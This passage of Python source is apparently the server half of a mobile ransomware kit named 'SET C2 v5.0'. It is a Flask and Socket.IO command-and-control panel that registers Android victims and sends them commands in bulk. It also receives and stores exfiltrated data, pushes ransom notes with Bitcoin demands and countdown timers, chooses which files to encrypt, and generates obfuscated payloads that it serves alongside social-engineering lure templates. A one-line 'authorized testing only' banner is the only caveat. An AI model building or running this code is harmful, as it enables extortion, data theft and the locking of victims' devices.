  .then(r=>r.json()).then(r=>{if(r.success)addLog('Ransom config saved','sys')});
}

function saveTargets(){
  const d = {
    encrypt_extensions: JSON.parse(document.getElementById('cfgExt').value),
    target_dirs: JSON.parse(document.getElementById('cfgDir').value)
  };
  fetch('/api/config/targets',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})
  .then(r=>r.json()).then(r=>{if(r.success)addLog('Target config saved','sys')});
}

function loadConfig(){
  fetch('/api/config').then(r=>r.json()).then(cfg=>{
    if(cfg.ransom){
      document.getElementById('cfgTitle').value = cfg.ransom.title||'';
      document.getElementById('cfgMsg').value = cfg.ransom.message||'';
      document.getElementById('cfgBtc').value = cfg.ransom.amount_btc||0.5;
      document.getElementById('cfgAddr').value = cfg.ransom.btc_address||'';
      document.getElementById('cfgEmail').value = cfg.ransom.email||'';
      document.getElementById('cfgTimer').value = cfg.ransom.timer_hours||72;
    }
    if(cfg.targets){
      document.getElementById('cfgExt').value = JSON.stringify(cfg.targets.encrypt_extensions||[],null,2);
      document.getElementById('cfgDir').value = JSON.stringify(cfg.targets.target_dirs||[],null,2);
    }
  });
}

function loadExfil(){
  fetch('/api/exfil').then(r=>r.json()).then(data=>{
    const t = document.getElementById('exfilTable');
    if(!data.length){t.innerHTML='<tr><td colspan="5" class="t-dim" style="text-align:center;padding:24px">No exfiltrated data.</td></tr>';return;}
    t.innerHTML = data.map(x=>`<tr>
      <td style="font-family:monospace;font-size:11px">${(x.victim_id||'?').slice(0,8)}...</td>
      <td>${x.data_type||'?'}</td>
      <td>${x.size||0} bytes</td>
      <td class="t-sm t-dim">${x.received_at?new Date(x.received_at).toLocaleString():'?'}</td>
      <td style="font-size:10px;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${(x.content||'').slice(0,100)}</td>
    </tr>`).join('');
  });
}

// Load templates on builder page enter
document.addEventListener('DOMContentLoaded', ()=>{ loadTemplates(); });
</script>
</body></html>
"""

# ================================================================
# FLASK ROUTES
# ================================================================

@app.route("/")
def index():
    return render_template_string(INDEX_HTML)

@app.route("/api/victims")
def api_victims():
    return jsonify(get_all_victims())

@app.route("/api/victim/<victim_id>/events")
def api_victim_events(victim_id):
    return jsonify(get_victim_events(victim_id))

@app.route("/api/exfil")
def api_exfil():
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM exfiltrated_data ORDER BY received_at DESC LIMIT 100")
    rows = [dict(r) for r in c.fetchall()]
    conn.close()
    return jsonify(rows)

@app.route("/api/command", methods=["POST"])
def api_command():
    data = request.json
    victim_id = data.get("victim_id")
    command = data.get("command", "")
    params = data.get("params", {})

    if victim_id == "__ALL__":
        cmd_ids = []
        for sid, vinfo in list(connected_victims.items()):
            vid = vinfo.get("victim_id")
            if vid and vinfo.get("status") in ("active", "locked"):
                cmd_id = issue_command(vid, command, params)
                cmd_ids.append(cmd_id)
                socketio.emit("command", {"id": cmd_id, "command": command, "params": params}, room=sid)
        return jsonify({"success": True, "command_ids": cmd_ids, "count": len(cmd_ids)})
    else:
        target_sid = None
        for sid, vinfo in connected_victims.items():
            if vinfo.get("victim_id") == victim_id:
                target_sid = sid
                break
        
        cmd_id = issue_command(victim_id, command, params)
        if target_sid:
            socketio.emit("command", {"id": cmd_id, "command": command, "params": params}, room=target_sid)
            return jsonify({"success": True, "command_id": cmd_id})
        else:
            return jsonify({"success": True, "command_id": cmd_id, "note": "Victim offline, queued"})

@app.route("/api/build", methods=["POST"])
def api_build():
    data = request.json
    host = data.get("host", "localhost")
    port = int(data.get("port", 8443))
    use_ssl = data.get("ssl", True)
    lock_mode = data.get("lock_mode", "full")
    obfuscation = data.get("obfuscation", "aes")
    name = data.get("name", "payload.apk")

    # Generate payload via embedded generator
    try:
        from set_payload_v5 import generate_payload
        payload_code = generate_payload(host, port, use_ssl, lock_mode, obfuscation)
    except ImportError:
        # Fallback: return config stub
        payload_code = f'''#!/usr/bin/env python3
# SET v5.0 Payload - C2: {host}:{port}
import base64,zlib,os,sys
CONFIG={json.dumps({"c2_host":host,"c2_port":port,"c2_ssl":use_ssl,"lock_mode":lock_mode})}
# (Full payload would be injected here by the builder)
'''
    
    payload_dir = Path(__file__).parent / "generated"
    payload_dir.mkdir(exist_ok=True)
    payload_path = payload_dir / f"payload_{int(time.time())}.py"
    payload_path.write_text(payload_code)

    return jsonify({
        "success": True,
        "download_url": f"/download/{payload_path.name}",
        "payload_code": payload_code[:500] + "\n# ... (truncated)" if len(payload_code) > 500 else payload_code
    })

@app.route("/download/<filename>")
def download_payload(filename):
    payload_dir = Path(__file__).parent / "generated"
    filepath = payload_dir / filename
    if not filepath.exists():
        abort(404)
    return send_file(str(filepath), as_attachment=True)

@app.route("/api/config")
def api_get_config():
    ransom_raw = get_config("ransom_note_template", "{}")
    try: ransom = json.loads(ransom_raw)
    except: ransom = {}
    exts_raw = get_config("encrypt_extensions", "[]")
    dirs_raw = get_config("target_dirs", "[]")
    try: exts = json.loads(exts_raw)
    except: exts = []
    try: dirs = json.loads(dirs_raw)
    except: dirs = []
    return jsonify({"ransom": ransom, "targets": {"encrypt_extensions": exts, "target_dirs": dirs}})

@app.route("/api/config/ransom", methods=["POST"])
def api_set_ransom():
    set_config("ransom_note_template", json.dumps(request.json))
    # Push to all connected victims
    for sid in connected_victims:
        socketio.emit("config_update", {"ransom_note": request.json}, room=sid)
    return jsonify({"success": True})

@app.route("/api/config/targets", methods=["POST"])
def api_set_targets():
    data = request.json
    set_config("encrypt_extensions", json.dumps(data.get("encrypt_extensions", [])))
    set_config("target_dirs", json.dumps(data.get("target_dirs", [])))
    return jsonify({"success": True})

# ================================================================
# BUILDER DASHBOARD ROUTE (Full multi-template dashboard)
# ================================================================

@app.route("/builder")
def builder_dashboard():
    """Render the full multi-template builder dashboard."""
    if not BUILDER_AVAILABLE:
        return '<html><body><h1>SET Builder v5 not installed</h1><p>Place set_builder_v5.py in the same directory and restart.</p></body></html>'
    
    # Build the template data JSON with all metadata
    templates_data = []
    for tid, t in TEMPLATE_REGISTRY.items():
        templates_data.append({
            "id": tid,
            "name": t["name"],
            "category": t["category"],
            "description": t["description"],
            "victim_profile": t["victim_profile"][:100],
            "psychology": t["psychology"][:100],
            "delivery_method": t["delivery_method"],
            "difficulty": t["difficulty"],
            "risk_detection": t["risk_detection"],
            "conversion_estimate": t["conversion_estimate"],
            "brand_colors": t["brand_colors"],
        })
    
    templates_json = json.dumps(templates_data)
    
    # Inject template data into the BUILDER_DASHBOARD_HTML
    html = BUILDER_DASHBOARD_HTML
    # Replace the empty template data with our JSON
    html = html.replace(
        '<script id="__TEMPLATE_DATA__" type="application/json">[]</script>',
        f'<script id="__TEMPLATE_DATA__" type="application/json">{templates_json}</script>'
    )
    # Also set the window variable fallback
    html = html.replace(
        "document.getElementById('__TEMPLATE_DATA__')?.textContent || '[]'",
        templates_json
    )
    
    return render_template_string(html)


# ================================================================
# SOCKET.IO EVENTS
# ================================================================

@socketio.on("connect")
def handle_connect():
    pass

@socketio.on("register_victim")
def handle_register(data):
    victim_id = data.get("victim_id")
    if not victim_id: return
    
    device_info = {
        "victim_id": victim_id,
        "device_name": data.get("device_name", "Unknown"),
        "android_version": data.get("android_version", "Unknown"),
        "manufacturer": data.get("manufacturer", "Unknown"),
        "model": data.get("model", "Unknown"),
        "sdk_level": data.get("sdk_level", 0),
        "ip": request.remote_addr,
        "first_seen": datetime.utcnow().isoformat(),
        "last_seen": datetime.utcnow().isoformat(),
        "status": "active",
        "lock_mode": data.get("lock_mode", "none"),
        "channel": "websocket",
        "battery": data.get("battery", 100),
    }
    
    connected_victims[request.sid] = device_info
    join_room(victim_id)
    
    # Upsert DB
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    existing = get_victim(victim_id)
    if existing:
        c.execute("""UPDATE victims SET device_name=?,android_version=?,manufacturer=?,
                   model=?,sdk_level=?,ip=?,last_seen=?,status=?,lock_mode=?,channel=?,battery=?
                   WHERE id=?""",
                  (device_info["device_name"],device_info["android_version"],
                   device_info["manufacturer"],device_info["model"],
                   device_info["sdk_level"],device_info["ip"],
                   device_info["last_seen"],device_info["status"],
                   device_info["lock_mode"],device_info["channel"],
                   device_info["battery"],victim_id))
    else:
        c.execute("""INSERT INTO victims (id,device_name,android_version,manufacturer,
                   model,sdk_level,ip,first_seen,last_seen,status,lock_mode,channel,battery)
                   VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                  (victim_id,device_info["device_name"],device_info["android_version"],
                   device_info["manufacturer"],device_info["model"],
                   device_info["sdk_level"],device_info["ip"],
                   device_info["first_seen"],device_info["last_seen"],
                   device_info["status"],device_info["lock_mode"],
                   device_info["channel"],device_info["battery"]))
    conn.commit()
    conn.close()
    
    add_event(victim_id, "registration", f"Connected: {device_info['device_name']}")
    socketio.emit("victim_update", device_info)

@socketio.on("status_update")
def handle_status_update(data):
    victim_id = data.get("victim_id")
    status = data.get("status", "active")
    lock_mode = data.get("lock_mode")
    progress = data.get("progress")
    details = data.get("details", "")
    battery = data.get("battery")
    
    # Update in-memory
    for sid, vinfo in connected_victims.items():
        if vinfo.get("victim_id") == victim_id:
            vinfo["status"] = status
            vinfo["last_seen"] = datetime.utcnow().isoformat()
            if lock_mode: vinfo["lock_mode"] = lock_mode
            if battery: vinfo["battery"] = battery
            break
    
    # Update DB
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    update_fields = {"status": status, "last_seen": datetime.utcnow().isoformat()}
    if lock_mode: update_fields["lock_mode"] = lock_mode
    if battery: update_fields["battery"] = battery
    
    set_clause = ", ".join(f"{k}=?" for k in update_fields)
    c.execute(f"UPDATE victims SET {set_clause} WHERE id=?",
              list(update_fields.values()) + [victim_id])
    conn.commit()
    conn.close()
    
    event_type = "lock" if status == "locked" else ("decrypt" if status == "decrypting" else "status")
    if progress: details += f" ({progress}%)"
    add_event(victim_id, event_type, details)
    
    socketio.emit("victim_event", {
        "victim_id": victim_id, "event_type": event_type,
        "details": details, "timestamp": datetime.utcnow().isoformat()
    })

@socketio.on("command_complete")
def handle_command_complete(data):
    cmd_id = data.get("command_id")
    result = data.get("result", "completed")
    victim_id = data.get("victim_id")
    
    mark_command_executed(cmd_id, result)
    socketio.emit("command_result", {"victim_id": victim_id, "command_id": cmd_id, "result": result})
    add_event(victim_id, "command_complete", f"Command {cmd_id[:8]}... completed")

@socketio.on("exfil_data")
def handle_exfil(data):
    victim_id = data.get("victim_id")
    data_type = data.get("type", "unknown")
    content = data.get("content", "")
    
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute("INSERT INTO exfiltrated_data (victim_id,data_type,content,received_at,size) VALUES (?,?,?,?,?)",
              (victim_id, data_type, content, datetime.utcnow().isoformat(), len(content)))
    conn.commit()
    conn.close()
    
    add_event(victim_id, "exfiltration", f"Data received: {data_type} ({len(content)} bytes)")
    socketio.emit("victim_event", {
        "victim_id": victim_id, "event_type": "exfiltration",
        "details": f"Data: {data_type} ({len(content)} bytes)",
        "timestamp": datetime.utcnow().isoformat()
    })

@socketio.on("disconnect")
def handle_disconnect():
    vinfo = connected_victims.pop(request.sid, None)
    if vinfo:
        victim_id = vinfo["victim_id"]
        conn = sqlite3.connect(str(DB_PATH))
        c = conn.cursor()
        c.execute("UPDATE victims SET status='offline', last_seen=? WHERE id=?",
                  (datetime.utcnow().isoformat(), victim_id))
        conn.commit()
        conn.close()
        add_event(victim_id, "disconnect", "Device went offline")
        vinfo["status"] = "offline"
        socketio.emit("victim_update", vinfo)

# ================================================================
# STARTUP
# ================================================================

if __name__ == "__main__":
    port = int(get_config("c2_port", "8443"))
    use_ssl = get_config("use_ssl", "true").lower() == "true"
    
    cert_path = Path(__file__).parent / "set_c2.crt"
    key_path = Path(__file__).parent / "set_c2.key"
    
    if use_ssl and not cert_path.exists():
        print("[*] Generating SSL certificate...")
        generate_self_signed_cert(cert_path, key_path)
    
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                SET C2 v5.0 SERVER                           ║
║           Sophisticated Encryption Toolkit                  ║
║                                                              ║
║  [+] Dashboard: http{'s' if use_ssl else ''}://0.0.0.0:{port}             ║
║  [+] WebSocket: ws{'s' if use_ssl else ''}://0.0.0.0:{port}                 ║
║  [+] Builder:   http{'s' if use_ssl else ''}://0.0.0.0:{port}/builder     ║
║  [+] Templates: 12 social engineering templates loaded      ║
║  [+] DB: {DB_PATH.name}                                       ║
║                                                              ║
║  WARNING: Authorized penetration testing only.              ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    ctx = (str(cert_path), str(key_path)) if use_ssl else None
    socketio.run(app, host="0.0.0.0", port=port, ssl_context=ctx, debug=False, log_output=False)
